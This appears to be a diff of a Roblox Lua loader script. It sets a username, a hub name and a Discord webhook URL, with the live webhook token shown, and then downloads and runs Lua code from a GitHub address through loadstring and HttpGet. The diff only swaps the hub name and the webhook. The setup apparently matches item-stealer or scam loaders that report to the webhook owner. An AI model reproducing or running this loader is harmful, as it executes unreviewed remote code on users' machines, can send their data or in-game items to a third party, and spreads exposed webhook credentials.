@@ -1,5 +1,5 @@
 _G.Username "IAmNobodyFRar" 
-_G.HubName "Galxied
-_G.WebhookUrl "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG" 
+_G.HubName "loeading"
+_G.WebhookUrl "https://discord.com/api/webhooks/1151547234006093884/VcT74Zqw9ZVWKYjNgxAzqlc-WyUTorCURBWrAgxVCYmhg8kO2HpJfTFT9oy6-4TuYab2" 
 
 loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
